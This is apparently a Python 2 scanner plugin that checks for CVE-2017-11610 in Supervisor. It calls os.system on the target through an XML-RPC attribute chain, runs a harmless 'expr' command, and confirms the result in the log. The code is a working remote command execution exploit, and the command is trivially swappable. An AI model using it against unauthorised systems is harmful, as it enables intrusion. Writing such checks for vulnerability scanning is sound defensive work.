# -*- coding: utf-8 -*-
# @Author  : helit
# Ref: https://github.com/phith0n/vulhub/blob/master/supervisor/CVE-2017-11610/poc.py

import xmlrpclib
import random
from lib.common import save_user_script_result


def do_check(self, url):
    if url != '/':
        return
    arg = self.host
    if ':9001' not in arg:
        domain = arg + ':9001'
    else:
        domain = arg
    target = 'http://' + domain +'/RPC2'
    try:
        proxy = xmlrpclib.ServerProxy(target)
        old = getattr(proxy, 'supervisor.readLog')(0,0)
        a = random.randint(10000000, 20000000)
        b = random.randint(10000000, 20000000)
        command = 'expr ' + str(a) + ' + ' + str(b)
        logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()
        getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format(command, logfile))
        result = getattr(proxy, 'supervisor.readLog')(0,0)
        if result[len(old):].strip() == str(a+b):
            save_user_script_result(self, '', arg, 'CVE-2017-11610 Supervisor Remote Command Execution')
    except Exception as e:
        pass
